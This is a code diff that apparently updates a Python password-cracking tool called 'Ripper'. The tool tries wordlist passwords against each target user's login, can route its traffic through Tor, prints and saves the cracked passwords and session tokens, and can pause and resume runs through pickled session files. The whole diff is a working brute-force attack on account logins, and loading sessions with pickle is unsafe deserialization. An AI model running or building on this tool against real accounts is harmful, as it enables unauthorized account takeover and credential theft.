@@ -1,39 +1,70 @@
+from resources.Configuration import Configuration, text_to_list
 from ripper.SocketLayer import SocketLayer
+from datetime import datetime
+import pickle
 import json
+import sys
+
+
+TIME_FORMAT = datetime.now().strftime("%Y%m%d-%H%M%S")
+RESULTS_FILE = "results-{}.json".format(TIME_FORMAT)
+SESSION_FILE = "ripper-{}.session".format(TIME_FORMAT)
 
 
 class Ripper:
-    dictionary = None
-
-    def __init__(self, dictionary=None, use_tor=False):
-        if dictionary is None:
-            self.dictionary = "resources/dictionary.json"
+    def __init__(self, target=None, targets=None, dictionary=None, use_tor=False, session=None):
+        if session is None:
+            if target is None and targets is None:
+                raise Exception("Error: target must be specified.")
+            elif targets is None:
+                t = [target]    # Config file works with lists
+            elif target is None:
+                t = text_to_list(targets)
+            if dictionary is None:
+                self.configuration = Configuration(targets=t, use_tor=use_tor)
+            else:
+                self.configuration = Configuration(targets=t, use_tor=use_tor, dictionary=dictionary)
         else:
-            self.dictionary = dictionary
-        self.socket = SocketLayer(use_tor)
+            session_file = open(session, 'rb')
+            self.configuration = pickle.load(session_file)  # Load serialized configuration
+            session_file.close()
+        self.socket = SocketLayer(self.configuration)
 
-    def execute(self, targets):
-        results = []
-        result = {}
-        with open(self.dictionary, 'r') as dictionary_values:
-            words = json.load(dictionary_values)
-        if type(targets) is list:
-            for targets in targets:
-                for password in words:
-                    response = self.socket.try_login(targets, password)
+    def execute(self):
+        print(self.configuration)
+        try:
+            while self.configuration.targets:
+                result = {'user': self.configuration.targets[0], 'password': '', 'token': ''}
+                for password in self.configuration.dictionary:
+                    # Print state of execution
+                    sys.stdout.write("Ripping... User: {}, Checking password: {}\t\r"
+                                     .format(self.configuration.targets[0], password))
+                    sys.stdout.flush()  # Flush buffer
+                    response = self.socket.try_login(self.configuration.targets[0], password)
                     if 'token' in response:
-                        result = {'user': targets, 'password': password, 'token': response['token']}
+                        print("Found password for user {}: {}\n".format(self.configuration.targets[0], password))
+                        result['password'] = password
+                        result['token'] = response['token']
                         break
-                    result = {'user': targets, 'error': response['error']}
-                results.append(result)
-        elif type(targets) is str:
-            for password in words:
-                response = self.socket.try_login(targets, password)
-                if 'token' in response:
-                    result = {'user': targets, 'password': password, 'token': response['token']}
-                    break
-                result = {'user': targets, 'error': response['error']}
-            results.append(result)
-        else:
-            raise Exception("The inserted users' type is not valid")
-        return results
+                self.configuration.targets.pop(0)
+                self.configuration.next_target(result)
+            print("\nFINISHED. All users tested. Saving results to file {}...".format(RESULTS_FILE), end="")
+            self.save_results(RESULTS_FILE)
+            print(" DONE")
+        except KeyboardInterrupt:
+            print("Aborted: Saving sesion to {} and results to {}...".format(SESSION_FILE, RESULTS_FILE), end="")
+            self.save_session()
+            print(" DONE")
+            exit()
+
+    def save_session(self):
+        """ Saves config session to file and exits, including pending targets and attacked ones.
+        :return:
+        """
+        session_file = open(SESSION_FILE, 'wb')
+        pickle.dump(self.configuration, session_file)
+        self.save_results(RESULTS_FILE)
+
+    def save_results(self, filepath):
+        with open(filepath, 'w') as f:
+            json.dump(self.configuration.checked_targets, f, indent=4)
